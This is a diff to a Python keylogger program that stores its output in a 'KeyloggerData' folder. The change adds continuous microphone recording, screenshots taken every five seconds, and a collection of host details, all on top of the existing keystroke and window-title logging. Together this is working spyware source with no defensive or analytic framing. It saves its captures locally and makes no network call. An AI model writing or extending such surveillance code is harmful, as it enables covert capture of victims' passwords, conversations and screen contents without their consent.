@@ -1,8 +1,13 @@
 import os
-from time import gmtime, strftime
+import platform
+import socket
+from time import gmtime, strftime, sleep
 from pynput.keyboard import Key, Listener
 from PIL import ImageGrab
 import pygetwindow
+import wave
+import pyaudio
+import threading
 
 # Get current timestamp
 time_stamp = strftime("%Y-%m-%d %H:%M:%S", gmtime())
@@ -11,20 +16,30 @@ time_stamp = strftime("%Y-%m-%d %H:%M:%S", gmtime())
 desktop_path = os.path.join(os.path.join(os.environ['USERPROFILE']), 'Desktop')
 folder_name = "KeyloggerData"
 file_path = os.path.join(desktop_path, folder_name)
+keystroke_path = os.path.join(file_path, "Keystrokes")
 screenshot_path = os.path.join(file_path, "Screenshots")
+pc_info_path = os.path.join(file_path, "PC Info")
+audio_path = os.path.join(file_path, "AudioFiles")  # New folder for audio files
 
 # Create directories if they do not exist
 os.makedirs(file_path, exist_ok=True)
+os.makedirs(keystroke_path, exist_ok=True)
 os.makedirs(screenshot_path, exist_ok=True)
+os.makedirs(pc_info_path, exist_ok=True)
+os.makedirs(audio_path, exist_ok=True)  # Create audio folder
 
 # File paths and file names
-full_file_path = file_path + "\\"
+full_keystroke_file_path = keystroke_path + "\\"
 full_file_path_screenshots = screenshot_path + "\\"
+full_pc_info_path = pc_info_path + "\\"
+full_audio_path = audio_path + "\\"  # Path to save audio files
 
 windowTitle = pygetwindow.getActiveWindowTitle()
 
 count = 0
 keys = []
+recording = True  # Flag to control recording
+taking_screenshots = True  # Flag to control screenshot capture
 
 # Function to get a unique filename for the text file
 def get_unique_text_filename():
@@ -56,7 +71,7 @@ def on_press(key):
 # Function to write keystrokes to the log file
 def write_file(keys, time_stamp, windowTitle):
     global current_text_file
-    with (open(full_file_path + current_text_file, "a") as f):
+    with open(full_keystroke_file_path + current_text_file, "a") as f:
         for key in keys:
             k = str(key)
             if k.find("backspace") > 0:
@@ -100,20 +115,88 @@ def write_file(keys, time_stamp, windowTitle):
 
 # Function to capture a screenshot and save it with a unique name
 def capture_screenshot():
-    # Create a unique filename using a timestamp
     screenshot_filename = "screenshot_" + strftime("%Y%m%d-%H%M%S", gmtime()) + ".png"
     screenshot = ImageGrab.grab()
     screenshot.save(full_file_path_screenshots + screenshot_filename)
+    print(f"Screenshot saved as {screenshot_filename}")
+
+# Function to take screenshots every 5 seconds in a separate thread
+def continuous_screenshot_capture():
+    global taking_screenshots
+    while taking_screenshots:
+        capture_screenshot()
+        sleep(5)  # Wait 5 seconds before taking the next screenshot
+
+# Function to continuously record audio from the microphone in a separate thread
+def continuous_audio_recording():
+    global recording
+    audio = pyaudio.PyAudio()
+    chunk = 1024
+    sample_format = pyaudio.paInt16
+    channels = 1
+    rate = 44100
+
+    audio_filename = "continuous_audio_" + strftime("%Y%m%d-%H%M%S", gmtime()) + ".wav"
+    audio_filepath = os.path.join(full_audio_path, audio_filename)  # Save to the AudioFiles folder
+
+    stream = audio.open(format=sample_format, channels=channels, rate=rate, input=True, frames_per_buffer=chunk)
+    frames = []
+
+    print("Starting continuous audio recording...")
+
+    while recording:
+        data = stream.read(chunk)
+        frames.append(data)
+
+    # Stop recording when `recording` is set to False
+    stream.stop_stream()
+    stream.close()
+    audio.terminate()
+
+    # Save the recorded audio
+    with wave.open(audio_filepath, 'wb') as wf:
+        wf.setnchannels(channels)
+        wf.setsampwidth(audio.get_sample_size(sample_format))
+        wf.setframerate(rate)
+        wf.writeframes(b''.join(frames))
+
+    print(f"Audio recorded and saved as {audio_filename}")
 
 # Function to detect key release events
 def on_release(key):
-    global current_text_file
+    global current_text_file, recording, taking_screenshots
     if key == Key.esc:
-        capture_screenshot()  # Take screenshot on esc key release with a unique filename
-        # Create a new text file with a unique name for the next round of keystrokes
-        current_text_file = get_unique_text_filename()
-        return False
+        print("Escape key pressed, stopping audio recording and screenshot capture.")
+        capture_screenshot()
+        taking_screenshots = False  # Stop the screenshot capture thread
+        recording = False  # Stop the audio recording thread
+        return False  # Stop the listener
+
+# Function to provide PC information
+def pc_information():
+    pc_info_file_name = "PC_Information_" + strftime("%Y%m%d-%H%M%S", gmtime()) + ".txt"
+    with open(full_pc_info_path + pc_info_file_name, "a") as f:
+        hostname = socket.gethostname()
+        ip = socket.gethostbyname(hostname)
+
+        f.write("Processor: " + (platform.processor()) + '\n')
+        f.write("Operating System: " + platform.system() + " " + platform.version() + '\n')
+        f.write("Machine: " + platform.machine() + "\n")
+        f.write("Hostname: " + hostname + "\n")
+        f.write("Private IP Address: " + ip + "\n")
+
+pc_information()
+
+# Start the continuous audio recording and screenshot capture in separate threads
+audio_thread = threading.Thread(target=continuous_audio_recording)
+screenshot_thread = threading.Thread(target=continuous_screenshot_capture)
+audio_thread.start()
+screenshot_thread.start()
 
 # Listener for key press and release events
 with Listener(on_press=on_press, on_release=on_release) as listener:
     listener.join()
+
+# Wait for the threads to finish
+audio_thread.join()
+screenshot_thread.join()
